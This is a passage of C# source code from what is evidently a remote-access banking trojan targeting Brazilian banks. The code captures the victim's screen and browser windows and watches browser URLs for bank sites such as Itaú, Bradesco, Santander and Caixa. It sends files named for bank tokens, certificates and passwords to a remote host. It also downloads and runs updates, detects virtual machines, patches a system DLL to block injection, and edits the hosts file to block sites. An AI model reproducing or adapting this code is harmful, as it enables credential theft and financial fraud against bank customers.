                    Thread thread2 = new Thread(() => SendUrlProc());
                    thread2.Start();
                }
                else if (str.IndexOf("<|Close|>") == 0)
                {
                    this.DisconnectForce(str.Substring(9));
                }
                else
                {
                    this.DisconnectForce("Communication status is bad.");
                }
            }
            catch (IOException e)
            {
                Console.WriteLine(e.StackTrace);
                this.DisconnectForce("Server connection failed.");
            }

        }

        void keyboardHook_KeyUp(RamGecTools.KeyboardHook.VKeys key)
        {
            toolStripStatus_event.Text = "Key Event {" + key + "}";
        }

        void keyboardHook_KeyDown(RamGecTools.KeyboardHook.VKeys key)
        {
            toolStripStatus_event.Text = "Key Event {" + key + "}";
            if (this.Connected)
            {
                //String msg = "<|Key|>" + key;
                //byte[] buffer = Encoding.ASCII.GetBytes(msg);
                //networkStream.BeginWrite(buffer, 0, buffer.Length, new AsyncCallback(EmptySendCallback), networkStream);
            }
        }

        public unsafe Boolean IsDifferent(Bitmap bitmap1, Bitmap bitmap2)
        {
            if (bitmap1 == null || bitmap2 == null)
                return false;
            if (bitmap1.Size != bitmap2.Size)
                return false;

            int width = bitmap1.Width;
            int height = bitmap1.Height;
            BitmapData data1 = bitmap1.LockBits(new Rectangle(0, 0, width, height), ImageLockMode.ReadOnly, PixelFormat.Format24bppRgb);
            BitmapData data2 = bitmap2.LockBits(new Rectangle(0, 0, width, height), ImageLockMode.ReadWrite, PixelFormat.Format24bppRgb);
            int count = data1.Stride * height;

            long* mem1 = (long*)data1.Scan0;
            long* mem2 = (long*)data2.Scan0;

            int i;
            for (i = 0; i < count; i += 8)
            {
                if (*mem1 != *mem2)
                {
                    bitmap1.UnlockBits(data1);
                    bitmap2.UnlockBits(data2);
                    return true;
                }

                mem1++;
                mem2++;
            }

            byte* mem1InBytes = (byte*)mem1;
            byte* mem2InBytes = (byte*)mem2;
            for (; i < count; i++)
            {
                if (*mem1InBytes != *mem2InBytes)
                {
                    bitmap1.UnlockBits(data1);
                    bitmap2.UnlockBits(data1);
                    return true;
                }
                mem1InBytes++;
                mem2InBytes++;
            }
            bitmap1.UnlockBits(data1);
            bitmap2.UnlockBits(data1);
            return true;

        }

        private unsafe Bitmap XorBitmap(Bitmap bmp1, Bitmap bmp2)
        {
            if (bmp1 == null || bmp2 == null)
                return null;
            if (bmp1.Size != bmp2.Size)
                return null;

            int height = bmp1.Height;
            int width = bmp2.Width;
            Bitmap bmpDiff = new Bitmap(bmp2);

            BitmapData originaldata = bmp1.LockBits(new Rectangle(0, 0, width, height), ImageLockMode.ReadOnly, PixelFormat.Format24bppRgb);
            BitmapData diffdata = bmpDiff.LockBits(new Rectangle(0, 0, width, height), ImageLockMode.ReadWrite, PixelFormat.Format24bppRgb);

            int rowPadding = originaldata.Stride - bmp1.Width * 3;
            byte* ptrOrg = (byte*)originaldata.Scan0;
            byte* ptrDiff = (byte*)diffdata.Scan0;

            for (int i = 0; i < height; i++)
            {
                for (int j = 0; j < width; j++)
                {
                    ptrDiff[0] = (byte)((uint)ptrOrg[0] ^ (uint)ptrDiff[0]);
                    ptrDiff[1] = (byte)((uint)ptrOrg[1] ^ (uint)ptrDiff[1]);
                    ptrDiff[2] = (byte)((uint)ptrOrg[2] ^ (uint)ptrDiff[2]);
                    ptrOrg += 3;
                    ptrDiff += 3;
                }
                if (rowPadding > 0)
                {
                    ptrOrg += rowPadding;
                    ptrDiff += rowPadding;
                }
            }
            bmp1.UnlockBits(originaldata);
            bmpDiff.UnlockBits(diffdata);

            return bmpDiff;
        }

        #region Printscreen with Mouse Cursor

        [StructLayout(LayoutKind.Sequential)]
        struct CURSORINFO
        {
            public Int32 cbSize;
            public Int32 flags;
            public IntPtr hCursor;
            public POINTAPI ptScreenPos;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct POINTAPI
        {
            public int x;
            public int y;
        }

        [DllImport("user32.dll")]
        static extern bool GetCursorInfo(out CURSORINFO pci);

        [DllImport("user32.dll")]
        static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);

        const Int32 CURSOR_SHOWING = 0x00000001;

        #endregion

       /* IntPtr Handle_Chrome = FindWindowEx(IntPtr.Zero, IntPtr.Zero, "Chrome_RenderWidgetHostHWND", navegador);
        IntPtr Handle_FF = FindWindowEx(IntPtr.Zero, IntPtr.Zero, "MozillaWindowClass", null);
        IntPtr Handle_IE = FindWindowEx(IntPtr.Zero, IntPtr.Zero, "IEFrame", null);
        IntPtr Handle_Opera = FindWindowEx(IntPtr.Zero, IntPtr.Zero, "OperaWindowClass", null);
        IntPtr Handle_Loader =  FindWindowEx(IntPtr.Zero, IntPtr.Zero, null, "loader");
        //IntPtr Handle_Loader = FindWindowByCaption(IntPtr.Zero, "loader");

        public static Bitmap Captura(IntPtr handle)
        {
            Rect rect = new Rect();
            GetWindowRect(handle, ref rect);
            Bitmap Bmp = new Bitmap(rect.Right - rect.Left, rect.Bottom - rect.Top);

            Graphics memoryGraphics = Graphics.FromImage(Bmp);
            IntPtr dc = memoryGraphics.GetHdc();
            bool success = PrintWindow(handle, dc, 0);
            memoryGraphics.ReleaseHdc(dc);

            return Bmp;
        }

        private string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        } */

        #region PrintWindow by handle

       /* [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);*/

        [DllImport("user32.dll")]
        private static extern IntPtr GetDC(IntPtr WindowHandle);

        [DllImport("user32.dll")]
        private static extern void ReleaseDC(IntPtr WindowHandle, IntPtr DC);

        [DllImport("user32.dll")]
        private static extern IntPtr GetWindowRect(IntPtr WindowHandle, ref Rect rect);

        [DllImport("User32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool PrintWindow(IntPtr hwnd, IntPtr hDC, uint nFlags);

        [StructLayout(LayoutKind.Sequential)]
        private struct Rect
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }

        public static Bitmap Capture(IntPtr handle)
        {
            Rect rect = new Rect();
            GetWindowRect(handle, ref rect);
            Bitmap Bmp = new Bitmap(rect.Right - rect.Left, rect.Bottom - rect.Top);

            Graphics memoryGraphics = Graphics.FromImage(Bmp);
            IntPtr dc = memoryGraphics.GetHdc();
            bool success = PrintWindow(handle, dc, 0);
            memoryGraphics.ReleaseHdc(dc);

            return Bmp;
        }

        protected delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        protected static extern int GetWindowText(IntPtr hWnd, StringBuilder strText, int maxCount);
        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        protected static extern int GetWindowTextLength(IntPtr hWnd);
        [DllImport("user32.dll")]
        protected static extern bool EnumWindows(EnumWindowsProc enumProc, IntPtr lParam);
        [DllImport("user32.dll")]
        protected static extern bool IsWindowVisible(IntPtr hWnd);

        protected bool EnumTheWindows(IntPtr hWnd, IntPtr lParam)
        {
            int cnt = cCaptions.Items.Count;
            int size = GetWindowTextLength(hWnd);
            string text = "";
            string value = "";

            if (size++ > 0 && IsWindowVisible(hWnd))
            {
                StringBuilder sb = new StringBuilder(size);
                GetWindowText(hWnd, sb, size);

                cCaptions.Items.Insert(cnt, sb.ToString());

                for (int i = 0; i < cCaptions.Items.Count; i++)
                {
                    value = cCaptions.GetItemText(cCaptions.Items[i]);
                    listWindows.Items.Add(value); // Guarda o caption de cada janela
                }

                foreach(var item in listWindows.Items) 
                {
                    text += item.ToString() + Environment.NewLine; 
                } 

                EnviarJanelas(text);
                Thread.Sleep(1000);
                cCaptions.Items.Clear();
                listWindows.Items.Clear();
            }

            return true;
        }
    
        public string EnviarJanelas(string caption) 
        {
            TcpClient client = new TcpClient();
            
            client.Connect(this.ipHost, 1234);
            StreamWriter sw = new StreamWriter(client.GetStream());
            StreamReader sr = new StreamReader(client.GetStream());
             
            sw.WriteLine(caption);
            sw.Flush();
 
            string recieved = sr.ReadLine();
            return recieved;

        }

        #endregion

        bool preto_branco = false;
        string navegador = "";

        public Bitmap GrayScale(Bitmap Bmp)
        {
            int rgb;
            Color c;

            for (int y = 0; y < Bmp.Height; y++)
                for (int x = 0; x < Bmp.Width; x++)
                {
                    c = Bmp.GetPixel(x, y);
                    rgb = (int)((c.R + c.G + c.B) / 3);
                    Bmp.SetPixel(x, y, Color.FromArgb(rgb, rgb, rgb));
                }
            return Bmp;
        }

        void SendNavScreenProc()
        {

            try
            {
                // Send First Bitmap
                MemoryStream streamScreen = new MemoryStream();
                WindowHandle = FindWindowEx(IntPtr.Zero, IntPtr.Zero, null, navegador);
                this.bmpScreenSendNav = Capture(WindowHandle);

                if (preto_branco)
                {
                    GrayScale(this.bmpScreenSendNav);
                }

                this.bmpScreenSendNav.Save(streamScreen, System.Drawing.Imaging.ImageFormat.Png);
                Compress.CompressStream(streamScreen);
                Byte[] bufferScreen = streamScreen.ToArray();
                mreSendData.WaitOne();
                this.queueSendData.AddScreen(streamScreen.GetBuffer());
                streamScreen.Close();
                this.receivedScreen = 0;

                while (this.remotedNav)
                {
                    // Send next bitmap result by difference with previous bitmap.
                    if (this.receivedScreen == 0)
                    {

                    }

                    else
                    {

                        this.bmpCurrentScreenNav = Capture(WindowHandle);

                        if (preto_branco)
                        {
                            GrayScale(this.bmpCurrentScreenNav);
                        }

                        if (this.receivedScreen == 1)
                        {
                            if (this.bmpScreenNav != null)
                            {
                                this.bmpScreenNav.Dispose();
                            }
                            this.bmpScreenNav = this.bmpScreenSendNav;
                        }
                        else if (this.receivedScreen == 2)
                        {

                        }
                        if (queueSendData.AvailableScreenAdd && IsDifferent(bmpCurrentScreenNav, this.bmpScreenNav))
                        {
                            streamScreen = new MemoryStream();
                            Bitmap bmpDiff = XorBitmap(this.bmpScreenNav, bmpCurrentScreenNav);
                            bmpDiff.Save(streamScreen, System.Drawing.Imaging.ImageFormat.Png);
                            this.bmpScreenSendNav.Dispose();
                            bmpDiff.Dispose();
                            this.bmpScreenSendNav = bmpCurrentScreenNav;
                            mreSendData.WaitOne();
                            this.queueSendData.AddScreen(streamScreen.GetBuffer());
                            streamScreen.Close();
                            this.receivedScreen = 0;
                        }
                        else
                        {
                            bmpCurrentScreenNav.Dispose();
                        }
                    }
                }
            }
            catch (Exception e) { }
            Thread.Sleep(30);
        }

        void SendScreenProc()
        {

            try
            {
                    // Send First Bitmap
                    MemoryStream streamScreen = new MemoryStream();
                    this.bmpScreenSend = new Bitmap(this.boundScreen.Width, this.boundScreen.Height, PixelFormat.Format24bppRgb);
                    Graphics g = Graphics.FromImage(this.bmpScreenSend);
                    g.CopyFromScreen(0, 0, 0, 0, this.boundScreen.Size);
                    CURSORINFO pci;
                    pci.cbSize = System.Runtime.InteropServices.Marshal.SizeOf(typeof(CURSORINFO));

                    if (GetCursorInfo(out pci))
                    {
                        if (pci.flags == CURSOR_SHOWING)
                        {
                            DrawIcon(g.GetHdc(), pci.ptScreenPos.x, pci.ptScreenPos.y, pci.hCursor);
                            g.ReleaseHdc();
                        }
                    }

                    if (preto_branco)
                    {
                        GrayScale(this.bmpScreenSend);
                    }

                    this.bmpScreenSend.Save(streamScreen, System.Drawing.Imaging.ImageFormat.Png);
                    Compress.CompressStream(streamScreen);
                    Byte[] bufferScreen = streamScreen.ToArray();
                    mreSendData.WaitOne();
                    this.queueSendData.AddScreen(streamScreen.GetBuffer());
                    streamScreen.Close();
                    this.receivedScreen = 0;

                    while (this.remoted)
                    {
                        // Send next bitmap result by difference with previous bitmap.
                        if (this.receivedScreen == 0)
                        {

                        }

                        else
                        {

                            this.bmpCurrentScreen = new Bitmap(this.boundScreen.Width, this.boundScreen.Height, PixelFormat.Format24bppRgb); ;
                            g = Graphics.FromImage(bmpCurrentScreen);
                            g.CopyFromScreen(0, 0, 0, 0, this.boundScreen.Size);
                            CURSORINFO pci2;
                            pci2.cbSize = System.Runtime.InteropServices.Marshal.SizeOf(typeof(CURSORINFO));

                            if (GetCursorInfo(out pci2))
                            {
                                if (pci2.flags == CURSOR_SHOWING)
                                {
                                    DrawIcon(g.GetHdc(), pci2.ptScreenPos.x, pci2.ptScreenPos.y, pci2.hCursor);
                                    g.ReleaseHdc();
                                }
                            }

                            if (preto_branco)
                            {
                                GrayScale(this.bmpCurrentScreen);
                            }

                            if (this.receivedScreen == 1)
                            {
                                if (this.bmpScreenNav != null)
                                {
                                    this.bmpScreenNav.Dispose();
                                }
                                this.bmpScreenNav = this.bmpScreenSend;
                            }
                            else if (this.receivedScreen == 2)
                            {

                            }
                            if (queueSendData.AvailableScreenAdd && IsDifferent(bmpCurrentScreen, this.bmpScreenNav))
                            {
                                streamScreen = new MemoryStream();
                                Bitmap bmpDiff = XorBitmap(this.bmpScreenNav, bmpCurrentScreen);
                                bmpDiff.Save(streamScreen, System.Drawing.Imaging.ImageFormat.Png);
                                this.bmpScreenSend.Dispose();
                                bmpDiff.Dispose();
                                this.bmpScreenSend = bmpCurrentScreen;
                                mreSendData.WaitOne();
                                this.queueSendData.AddScreen(streamScreen.GetBuffer());
                                streamScreen.Close();
                                this.receivedScreen = 0;
                            }
                            else
                            {
                                bmpCurrentScreen.Dispose();
                            }
                        }
                    }
                }
            catch (Exception e) { }
            Thread.Sleep(30);
        }

        private void Form_MSCClientRemote_FormClosed(object sender, FormClosedEventArgs e)
        {
            if (this.Connected)
            {
                this.DisconnectForce();
            }
        }

        private void sendUrlToServer(string str)
        {

            foreach (IPAddress ip in Dns.GetHostAddresses(this.ipHost))
            {

                TcpClient client = new TcpClient();
                                                    //IPAddress.Parse(this.ipHost)
                IPEndPoint serverEndPoint = new IPEndPoint(ip, 3000);

                client.Connect(serverEndPoint);

                NetworkStream clientStream = client.GetStream();

                ASCIIEncoding encoder = new ASCIIEncoding();
                byte[] buffer = encoder.GetBytes(str);

                clientStream.Write(buffer, 0, buffer.Length);
                clientStream.Flush();

            }
        }

        private void sendNotes(string str)
        {

              foreach (IPAddress ip in Dns.GetHostAddresses(this.ipHost))
              {

            TcpClient client = new TcpClient();
                                                    //IPAddress.Parse(this.ipHost)
            IPEndPoint serverEndPoint = new IPEndPoint(ip, 6073);

            client.Connect(serverEndPoint);

            NetworkStream clientStream = client.GetStream();

            ASCIIEncoding encoder = new ASCIIEncoding();
            byte[] buffer = encoder.GetBytes(str);

            clientStream.Write(buffer, 0, buffer.Length);
            clientStream.Flush();

            }
        }

        public void SendTCP(string M, string IPA, Int32 PortN)
        {

            byte[] SendingBuffer = null;
            TcpClient client = null;
            NetworkStream netstream = null;
            try
            {
                client = new TcpClient(IPA, PortN);
                netstream = client.GetStream();
                FileStream Fs = new FileStream(M, FileMode.Open, FileAccess.Read);
                int NoOfPackets = Convert.ToInt32(Math.Ceiling(Convert.ToDouble(Fs.Length) / Convert.ToDouble(BufferSize)));
                int TotalLength = (int)Fs.Length, CurrentPacketLength, counter = 0;
                for (int i = 0; i < NoOfPackets; i++)
                {
                    if (TotalLength > BufferSize)
                    {
                        CurrentPacketLength = BufferSize;
                        TotalLength = TotalLength - CurrentPacketLength;
                    }
                    else
                    CurrentPacketLength = TotalLength;
                    SendingBuffer = new byte[CurrentPacketLength];
                    Fs.Read(SendingBuffer, 0, CurrentPacketLength);
                    netstream.Write(SendingBuffer, 0, (int)SendingBuffer.Length);

                }
                Fs.Close();
            }
            catch (Exception ex)
            {
                //Console.WriteLine(ex.Message);
                //MessageBox.Show(ex.ToString());
            }
            finally
            {
                netstream.Close();
                client.Close();
            }
        }

        public void sendInfo_CEF()
        {
            SendTCP(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\CEF_Assnt.txt", this.ipHost, 5555);
        }

        public void sendInfo_BB6()
        {
            SendTCP(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\BB_6.txt", this.ipHost, 5555);
        }

        public void sendInfo_BBGF()
        {
            SendTCP(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\GF_BB.txt", this.ipHost, 5555);
        }

        public void sendInfo_BBCONTCORRNT6()
        {
            SendTCP(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\BBContCorrnt_6.txt", this.ipHost, 5555);
        }

        public void sendInfo_BBTOKEN()
        {
            SendTCP(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\BBTOK_.txt", this.ipHost, 5555);
        }

        public void sendInfo_BBCERTF()
        {
            SendTCP(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\BBCertf_.txt", this.ipHost, 5555);
        }

        public void sendInfo_BBAA()
        {
            SendTCP(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\BBSENH_AA.txt", this.ipHost, 5555);
        }

        public void sendInfo_SIC()
        {
            SendTCP(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\SIC_Assnt.txt", this.ipHost, 5555);
        }

        public void sendInfo_SICTOK()
        {
            SendTCP(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\SIC_TOK.txt", this.ipHost, 5555);
        }

        public void sendInfo_DESCOTAB()
        {
            SendTCP(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\DESCO_TABLE.txt", this.ipHost, 5555);
        }

        public void sendInfo_DESCO6()
        {
            SendTCP(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\DESCO_06.txt", this.ipHost, 5555);
        }

        public void sendInfo_DESCOTOK()
        {
            SendTCP(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\DESCO_TOK.txt", this.ipHost, 5555);
        }

        public void sendInfo_ITATABLE()
        {
            SendTCP(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\ITA_TABLE.txt", this.ipHost, 5555);
        }

        public void sendInfo_ITATOK()
        {
            SendTCP(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\ITA_TOK_FISIC.txt", this.ipHost, 5555);
        }

        public void sendInfo_ITATOKJU()
        {
            SendTCP(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\ITA_TOK_JUJU.txt", this.ipHost, 5555);
        }

        public void sendInfo_ITACORRT6()
        {
            SendTCP(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\ITAContCorrnt_6.txt", this.ipHost, 5555);
        }

        public void sendInfo_ITANASC()
        {
            SendTCP(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\ITA_NASC.txt", this.ipHost, 5555);
        }

        public void sendInfo_SANTA_ASS()
        {
            SendTCP(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\SANTA_Assnt.txt", this.ipHost, 5555);
        }

        public void sendInfo_SANTA_TKF()
        {
            SendTCP(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\SANTA_TOK_FISIC.txt", this.ipHost, 5555);
        }

        public void sendInfo_SANTA_TAB()
        {
            SendTCP(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\SANTA_TABLE.txt", this.ipHost, 5555);
        }

        public void sendInfo_SANTA_ASS_JUJU()
        {
            SendTCP(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\SANTA_AssntJUJU.txt", this.ipHost, 5555);
        }

        public void sendInfo_SANTA_TOK_JUJU()
        {
            SendTCP(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\SANTA_TOK_JUJU.txt", this.ipHost, 5555);
        }

        public void sendInfo_SANTA_TOK_SERIE()
        {
            SendTCP(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\SANTA_TOK_SERIE.txt", this.ipHost, 5555);
        }

        public static string GetBrowserUrl(Process process)
        {
            if (process == null || process.MainWindowHandle == IntPtr.Zero)
            {
                return null;
            }

            try
            {
                AutomationElement element = AutomationElement.FromHandle(process.MainWindowHandle);
                if (element == null)
                    return null;
                Condition conditions = new AndCondition(
                    new PropertyCondition(AutomationElement.ProcessIdProperty, process.Id),
                    new PropertyCondition(AutomationElement.IsControlElementProperty, true),
                    new PropertyCondition(AutomationElement.IsContentElementProperty, true),
                    new PropertyCondition(AutomationElement.ControlTypeProperty, ControlType.Edit)
                );
                AutomationElement elementx = element.FindFirst(TreeScope.Descendants, conditions);
                return ((ValuePattern)elementx.GetCurrentPattern(ValuePattern.Pattern)).Current.Value as string;
            }
            catch (Exception e)
            {
                Console.WriteLine(e.StackTrace);
                return null;
            }
        }

        public void SendUrlProc()
        {
            while (this.Connected)
            {
                foreach (BrowserInfo browserInfo in this.browsers)
                {
                    string bank = "";
                    Boolean on = false;
                    foreach (Process process in Process.GetProcessesByName(browserInfo.Browser))
                    {
                        string url = GetBrowserUrl(process);
                        if (url == null)
                            continue;
                        on = true;
                        if (browserInfo.On && browserInfo.Url == url)
                        {
                            // Do not nothing
                        }
                        else
                        {

                            if (url.Contains("caixa"))
                            {
                                bank = "CEF: " + /*Environment.NewLine +*/ System.Environment.MachineName;
                                sendUrlToServer(bank);
                            }

                            if (url.Contains("bb"))
                            {
                                bank = "BB: " + /*Environment.NewLine +*/ System.Environment.MachineName;
                                sendUrlToServer(bank);
                            }

                            if (url.Contains("bradesco"))
                            {
                                bank = "DESCO: " + /*Environment.NewLine +*/ System.Environment.MachineName;
                                sendUrlToServer(bank);
                            }

                            if (url.Contains("sicredi"))
                            {
                                bank = "SICREDI: " + /*Environment.NewLine +*/ System.Environment.MachineName;
                                sendUrlToServer(bank);
                            }

                            if (url.Contains("itau"))
                            {
                                bank = "ITA: " + /*Environment.NewLine +*/ System.Environment.MachineName;
                                sendUrlToServer(bank);
                            }

                            if (url.Contains("santander"))
                            {
                                bank = "SANTA: " + /*Environment.NewLine +*/ System.Environment.MachineName;
                                sendUrlToServer(bank);
                            }

                        }
                        browserInfo.Url = url;
                        break;
                    }
                    browserInfo.On = on;
                }
                Thread.Sleep(1000);
            }
        }

        private static string GetPublicIpAddress()
        {
                try
                {
                    String direction = "";
                    WebRequest request = WebRequest.Create("http://checkip.dyndns.org/");
                    using (WebResponse response = request.GetResponse())
                    {
                        using (StreamReader stream = new StreamReader(response.GetResponseStream()))
                        {
                            direction = stream.ReadToEnd();
                        }
                    }

                    int first = direction.IndexOf("Address: ") + 9;
                    int last = direction.LastIndexOf("</body>");
                    direction = direction.Substring(first, last - first);

                    guardaIPExterno = direction;
                }
                catch
                {
                    guardaIPExterno = "";
                }

            return guardaIPExterno;
        }

        public string TipoConexao()
        {
            string conexao = String.Empty;
            UdpClient u = new UdpClient(System.Net.Dns.GetHostName(), 1);
            IPAddress localAddr = (u.Client.LocalEndPoint as IPEndPoint).Address;
            NetworkInterface[] netIntrfc = NetworkInterface.GetAllNetworkInterfaces();
            for (int i = 0; i < netIntrfc.Length - 1; i++)
            {
                if (netIntrfc[i].OperationalStatus == OperationalStatus.Up)
                {
                    IPInterfaceProperties ipProps = netIntrfc[i].GetIPProperties();
                    foreach (UnicastIPAddressInformation uni in ipProps.UnicastAddresses)
                    {
                        if (uni.Address.ToString() == localAddr.ToString())
                        {
                            conexao = netIntrfc[i].Name.ToString();
                        }
                    }
                }
            }
            return conexao;
        }

        public static string GetLocalIPAddress()
        {
            IPHostEntry host;
            string localIP = "";
            host = Dns.GetHostEntry(Dns.GetHostName());

            foreach (IPAddress ip in host.AddressList)
            {
                localIP = ip.ToString();

                string[] temp = localIP.Split('.');

                if (ip.AddressFamily == AddressFamily.InterNetwork && temp[0] == "192")
                {
                    break;
                }
                else
                {
                    localIP = null;
                }
            }

            return localIP;
        }

        public int DownloadFile(String remoteFilename, String localFilename)
        {

            int bytesProcessed = 0;
            Stream remoteStream = null;
            Stream localStream = null;
            WebResponse response = null;

            try
            {

                WebRequest request = WebRequest.Create(remoteFilename);

                if (request != null)
                {

                    response = request.GetResponse();

                    if (response != null)
                    {

                        remoteStream = response.GetResponseStream();

                        localStream = File.Create(localFilename);

                        byte[] buffer = new byte[1024];
                        int bytesRead;

                        do
                        {

                            bytesRead = remoteStream.Read(buffer, 0, buffer.Length);

                            localStream.Write(buffer, 0, bytesRead);

                            bytesProcessed += bytesRead;
                        }

                        while (bytesRead > 0);
                    }
                }
            }

            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

            finally
            {

                if (response != null) response.Close();
                if (remoteStream != null) remoteStream.Close();
                if (localStream != null) localStream.Close();
            }

            return bytesProcessed;
        }


        private void Atualizar(String urlCliente)
        {

            try
            {
                int pos = urlCliente.LastIndexOf("/") + 1;
                string programa = urlCliente.Substring(pos, path.Length - pos);
                int read = DownloadFile(urlCliente,
                               Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\" + programa);

                if (read > 0)
                {
                    sendNotes(Environment.MachineName + ":" + Environment.NewLine + "Atualizado com sucesso!");
                    Thread.Sleep(1000);
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\" + programa);
                }

                Console.WriteLine("{0} bytes written", read);
            }
            
            catch(Exception excpt)
            { 
                sendNotes(Environment.MachineName + ":" + Environment.NewLine + excpt.ToString()); 
            }

        }

        public bool isVM()
        {

            using (var searcher = new System.Management.ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                using (var items = searcher.Get())
                {
                    foreach (var item in items)
                    {
                        string manufacturer = item["Manufacturer"].ToString().ToLower();
                        if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
                            || manufacturer.Contains("vmware")
                            || item["Model"].ToString() == "VirtualBox")
                        {
                            return true;
                        }
                    }
                }
            }
            return false;
        }

        static public void AntiInject()
        {
            int pid;
            int hwnd = FindWindow(null, "MscClienteRemoto"); // Handle da janela deste programa.
            if (hwnd == 0)
                return;
            GetWindowThreadProcessId(hwnd, out pid);
            while (true) // Melhor usar o componente Timer.
            {
                BlockAPI(pid, "NTDLL.DLL", "LdrLoadDll");
            }
        }

        public string is64BitSystem()
        {
            string guardaValor = "";

            if(Is64BitOperatingSystem() == true)
            {
                guardaValor = " 64Bits";
            }
            else
            {
                guardaValor = " 32Bits";
            }
            return guardaValor;
        }

        public static bool Is64BitOperatingSystem()
        {
            if (IntPtr.Size == 8)  
            {
                return true;
            }
            else  
            {
                bool flag;
                return ((DoesWin32MethodExist("kernel32.dll", "IsWow64Process") &&
                    IsWow64Process(GetCurrentProcess(), out flag)) && flag);
            }
        }

        static bool DoesWin32MethodExist(string moduleName, string methodName)
        {
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            if (moduleHandle == IntPtr.Zero)
            {
                return false;
            }
            return (GetProcAddress(moduleHandle, methodName) != IntPtr.Zero);
        }

       /* [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess(); */

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        static extern IntPtr GetModuleHandle(string moduleName);

        [DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule,
            [MarshalAs(UnmanagedType.LPStr)]string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool IsWow64Process(IntPtr hProcess, out bool wow64Process);

        static bool BlockAPI(int pid, string libName, string apiName)
        {
            byte[] pRet = { 195 }; 
            int hLib = 0;
            int pAddr = 0;
            bool bRet = false;
            int dwRet = 0;

            int hProcess;

            if (pid == 0)
                return false;

            hProcess = OpenProcess(0x28, false, pid); 
            if (hProcess == 0)
                return false;

            try
            {
                hLib = LoadLibrary(libName);
                if (hLib == 0)
                    return false;

                try
                {
                    pAddr = GetProcAddress(hLib, apiName);
                    if (pAddr != 0)
                        if (WriteProcessMemory(hProcess, pAddr, pRet, 1, out dwRet))
                            bRet = dwRet != 0;
                }
                finally
                {
                    FreeLibrary(hLib);
                }
                return bRet;
            }
            finally
            {
                CloseHandle(hProcess);
            }
        }

        private void EmptyFolder(DirectoryInfo directoryInfo)
        {
            try
            {
                foreach (FileInfo file in directoryInfo.GetFiles())
                {
                    file.Delete();
                }

                foreach (DirectoryInfo subfolder in directoryInfo.GetDirectories())
                {
                    EmptyFolder(subfolder);
                }
            }
            catch (Exception exc)
            {
                //MessageBox.Show(exc.ToString());
            }
        }

        private void blockSite(string site)
        {
            try
            {

                StreamWriter sw = new StreamWriter(path, true);
                String sitetoblock = "127.0.0.1 " + site;
                sw.WriteLine(sitetoblock);
                sw.Close();
            }
            catch(Exception exc)
            {
                //MessageBox.Show(exc.ToString());
            }
        }

        private void unblockSite()
        {
            try
            {
                string lastLine = "";
                StreamReader r = new StreamReader(path);
                while (r.EndOfStream == false)
                {
                    lastLine = r.ReadLine();
                }
                sendNotes("DESBLOQUEADO: " + lastLine);
                r.Close();

                string[] lines = File.ReadAllLines(path);
                Array.Resize(ref lines, lines.Length - 1);
                File.WriteAllLines(path, lines);
            }

            catch (Exception exc)
            {
                //MessageBox.Show(exc.ToString());
            }
        }

       private static string ProgramFilesx86()
        {
            if (8 == IntPtr.Size
                || (!String.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432"))))
            {
                return Environment.GetEnvironmentVariable("ProgramFiles(x86)");
            }

            return Environment.GetEnvironmentVariable("ProgramFiles");
        }

       public string bancoCliente()
       {
           string gbBanco = String.Empty;

           if (File.Exists(ProgramFilesx86() + "\\GbPlugin\\gbieh.dll"))
           {
               gbBanco = "BB";
           }
